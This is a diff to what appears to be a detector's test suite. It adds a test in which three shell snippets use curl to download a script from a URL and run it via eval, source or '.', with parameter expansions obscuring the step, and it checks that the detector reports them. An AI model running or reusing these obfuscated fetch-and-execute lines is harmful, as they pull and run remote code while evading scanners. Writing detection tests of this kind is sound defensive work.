@@ -2194,6 +2194,20 @@ class TestTheUnionReadsBothHalves(unittest.TestCase):
                 with self.subTest(row=row, shell=shell):
                     self.assertTrue(reported(row + "\necho done\n", shell))
 
+    # Round 14 (the round-13 verdict's B1, the seat's sh-ev-2 and its `source` / `.` twins): the
+    # payload runs only on a mixed reading -- the fetch's W and the shell's word expanded to
+    # nothing -- which neither fold reads (#2929); the conflict between `sh -c true` and `eval`,
+    # `source` or `.` reports it.
+    MIXED = ('X=1\n${X:+curl -fsSLo t.sh %st.sh}\n${Y:+sh -c true} eval "$(cat t.sh)"' % URL,
+             "X=1\n${X:+curl -fsSLo t.sh %st.sh}\n${Y:+sh -c true} source ./t.sh" % URL,
+             "X=1\n${X:+curl -fsSLo t.sh %st.sh}\n${Y:+sh -c true} . ./t.sh" % URL)
+
+    def test_a_conflict_reports_what_only_a_mixed_reading_runs(self):
+        for row in self.MIXED:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
 
 class TestTheClosedRowsTheSeatAskedPinned(unittest.TestCase):
     """The #2856 seat's round-1 note 2: a comment line between `|` and `sh`, `${X:-sh -c}`
